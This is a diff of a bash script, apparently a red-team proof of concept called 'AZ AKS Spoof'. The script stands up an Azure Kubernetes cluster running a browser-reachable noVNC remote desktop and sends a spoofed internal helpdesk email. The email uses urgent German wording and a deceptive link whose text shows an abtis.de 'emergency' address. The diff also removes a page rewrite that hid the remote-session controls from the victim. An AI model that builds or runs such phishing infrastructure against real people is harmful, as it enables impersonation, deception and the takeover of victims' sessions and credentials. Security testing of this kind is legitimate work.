@@ -1,6 +1,6 @@
 #!/bin/bash
 ## Author Patrick Binder
-## Version 1.1
+## Version 1.2
 ## Date 2025-01-01
 ## Filename azaksmail.sh
 
@@ -54,14 +54,14 @@ check_azure_cloud_shell() {
 ############################################################
 display_banner() {
     display_message "############################################################################" "cyan"
-    display_message "#     ___ _____      ___    __ _______    _____ ____  ____  ____  ______   #" "magenta"
-    display_message "#    /   /__  /     /   |  / //_/ ___/   / ___// __ \/ __ \/ __ \/ ____/   #" "magenta"
-    display_message "#   / /| | / /     / /| | / ,<  \__ \    \__ \/ /_/ / / / / / / / /_       #" "magenta"
-    display_message "#  / ___ |/ /__   / ___ |/ /| |___/ /   ___/ / ____/ /_/ / /_/ / __/       #" "magenta"
-    display_message "# /_/  |_/____/  /_/  |_/_/ |_/____/   /____/_/    \____/\____/_/          #" "magenta"
-    display_message "#                                                                          #" "magenta"
-    display_message "#            Azure POC Mailing Tool - AZ AKS Spoof                         #" "magenta"
-    display_message "#            Embedding RDP Environment in a website                        #" "magenta"
+    display_message "#     ___ _____      ___    __ _______    _____ ____  ____  ____  ______   #" "cyan"
+    display_message "#    /   /__  /     /   |  / //_/ ___/   / ___// __ \/ __ \/ __ \/ ____/   #" "cyan"
+    display_message "#   / /| | / /     / /| | / ,<  \__ \    \__ \/ /_/ / / / / / / / /_       #" "cyan"
+    display_message "#  / ___ |/ /__   / ___ |/ /| |___/ /   ___/ / ____/ /_/ / /_/ / __/       #" "cyan"
+    display_message "# /_/  |_/____/  /_/  |_/_/ |_/____/   /____/_/    \____/\____/_/          #" "cyan"
+    display_message "#                                                                          #" "cyan"
+    display_message "#            Azure POC Mailing Tool - AZ AKS Spoof                         #" "cyan"
+    display_message "#            🦄 Embedding RDP Environment in a website🦄                   #" "cyan"
     display_message "############################################################################" "cyan"
 }
 
@@ -219,7 +219,7 @@ main() {
     display_banner
 
     # Example usage info
-    display_message "Example usage: $0 -SmtpServer 'fallback.mail.protection.outlook.com' -To 'helpdesk@fallback.onmicrosoft.com' -From 'helpdesk@fallback.onmicrosoft.com' -Subject 'Test Email' -Firstname 'John' -Lastname 'Doe'" "cyan"
+    display_message "Example usage: $0 -SmtpServer 'fallback.mail.protection.outlook.com' -To 'helpdesk@fallback.onmicrosoft.com' -From 'helpdesk@fallback.onmicrosoft.com' -Subject 'Test Email' -Firstname 'John' -Lastname 'Doe'" "yellow"
     # Prompt user
     confirm_execution
 
@@ -275,7 +275,7 @@ main() {
     
     display_message "AKS Cluster created: $aks_name" "green"
 
-   # Deploy RDP Container
+  # Deploy RDP Container
 display_message "Deploying RDP Container..." "blue"
 cat <<EOF > rdp-deployment.yaml
 apiVersion: apps/v1
@@ -315,10 +315,13 @@ kubectl apply -f rdp-deployment.yaml >/dev/null 2>&1
 display_message "Waiting for AKS to assign public IP..." "yellow"
 
 
+
+
+
 # Wait for public IP
 while [[ -z "$public_ip" ]]; do
     public_ip=$(kubectl get service rdp-service -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)
-    sleep 2.5
+    sleep 20
 done
 display_message "AKS Public IP assigned: $public_ip" "green"
 
@@ -330,23 +333,17 @@ while [[ $container_ready -eq 0 ]]; do
         container_ready=1
     else
         display_message "RDP container not ready yet. Waiting for 30 seconds..." "yellow"
-        sleep 30
+        sleep 45
     fi
 done
 display_message "RDP container is ready." "green"
 
-sleep 30
-
-# Modify the file in the container
-display_message "Modifying /usr/share/novnc/index.html in the container..." "blue"
-kubectl exec $(kubectl get pods -l app=rdp -o jsonpath='{.items[0].metadata.name}') -- bash -c "echo '<!DOCTYPE html><html lang=\"en\"><head><title>Remote Desktop</title><style>html, body {margin: 0; padding: 0; overflow: hidden; height: 100%; width: 100%;} canvas {display: block; width: 100%; height: 100%; background-color: black;} #noVNC_status_bar, #noVNC_buttons {opacity: 0; pointer-events: none;}</style><script type=\"module\">import RFB from \"./core/rfb.js\";document.addEventListener(\"DOMContentLoaded\", () => {const urlParams = new URLSearchParams(window.location.search);const host = urlParams.get(\"host\") || \"localhost\";const port = urlParams.get(\"port\") || \"6901\";const path = urlParams.get(\"path\") || \"websockify\";const rfb = new RFB(document.body, \`ws://${host}:${port}/${path}\`, { shared: true });rfb.scaleViewport = true;rfb.resizeSession = true;rfb.viewOnly = false;window.addEventListener(\"resize\", () => {rfb.scaleViewport = true;rfb.resizeSession = true;});});</script></head><body></body></html>' > /usr/share/novnc/index.html"
-display_message "File /usr/share/novnc/index.html modified successfully." "green"
-
+sleep 45
 
     # Wait for public IP
     while [[ -z "$public_ip" ]]; do
         public_ip=$(kubectl get service rdp-service -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)
-        sleep 2.5
+        sleep 12
     done
     display_message "AKS Public IP assigned: $public_ip" "green"
 
@@ -376,7 +373,7 @@ display_message "File /usr/share/novnc/index.html modified successfully." "green
     <title>Redirect</title>
     <script>
         document.addEventListener("DOMContentLoaded", function() {
-            window.location.href = "http://$public_ip:6901/vnc.html?autoconnect=true&reconnect=true&resize=on&show_control_bar=false";
+            window.location.href = "http://$public_ip:6901/";
         });
     </script>
 </head>
@@ -400,13 +397,15 @@ EOF
         -o tsv)
 
     # Build HTML email body
-    email_body="<!DOCTYPE html><html><body>"
+    email_body="<!DOCTYPE html><html><head><meta charset=\"UTF-8\"></head><body>"
     email_body+="<p>Hi ${firstname},</p>"
     email_body+="<p>Schau dir das bitte dringend bis heute Abend an!</p>"
+    email_body+="<p></p>"
+    email_body+="<p>Grüße</p>"
     email_body+="<p><a href=\"${website_url}\">https://www.abtis.de/emergency</a></p>"
-    email_body+="</body></html>"
+    email_body+="</body></html>"    
 
-    # Send Email
+        # Send Email
     display_message "Sending Email to $recipient ..." "blue"
     send_email "$smtp_server" "$recipient" "$mail_address" "$subject" "$email_body"
     display_message "Email sent successfully to $recipient." "green"
@@ -419,19 +418,34 @@ EOF
     display_message "############################################" "cyan"
     display_message "" "cyan"
 
-    # Ask user about next steps
-    display_message "Please check your mailbox (including junk folder) for the test email." "yellow"
-    read -p "Do you want to exit now (yes) or connect via SSH to the cluster node (no)? (yes/no): " next_step
-    if [[ "$next_step" == "yes" ]]; then
-        display_message "Exiting script as per user choice." "green"
-        exit 0
-    else
-        display_message "Proceeding with SSH connection attempt." "blue"
-        ssh-keyscan "$public_ip" >> ~/.ssh/known_hosts 2>/dev/null || true
-        chmod 600 "$ssh_key_name"
-        display_message "Attempting to connect to sshusername@$public_ip ..." "blue"
-        ssh -i "$ssh_key_name" sshusername@"$public_ip"
-    fi
+    # Ask user about ssh connection
+ display_message "Please check your mailbox (including junk folder) for the test email." "yellow"
+read -p "Do you want to optionally connect via SSH to the cluster node? (yes/no): " next_step
+if [[ "$next_step" == "yes" ]]; then
+    display_message "Proceeding with SSH connection attempt." "blue"
+    
+    # Get the node resource group
+    node_resource_group=$(az aks show --resource-group "$resource_group" --name "$aks_name" --query nodeResourceGroup -o tsv)
+    
+    # Get the VMSS name
+    vmss_name=$(az vmss list --resource-group "$node_resource_group" --query "[0].name" -o tsv)
+    
+    # Get the instance ID
+    instance_id=$(az vmss list-instances --resource-group "$node_resource_group" --name "$vmss_name" --query "[0].instanceId" -o tsv)
+    
+    # Get the public IP address of the instance
+    public_ip=$(az vmss list-instance-public-ips --resource-group "$node_resource_group" --name "$vmss_name" --query "[0].ipAddress" -o tsv)
+    
+    # Add the public IP to known hosts
+    ssh-keyscan "$public_ip" >> ~/.ssh/known_hosts 2>/dev/null || true
+    chmod 600 "$ssh_key_name"
+    
+    display_message "Attempting to connect to azureuser@$public_ip ..." "blue"
+    ssh -i "$ssh_key_name" azureuser@"$public_ip"
+else
+    display_message "Exiting script as per user choice." "green"
+    exit 0
+fi
 }
 
 main "$@"
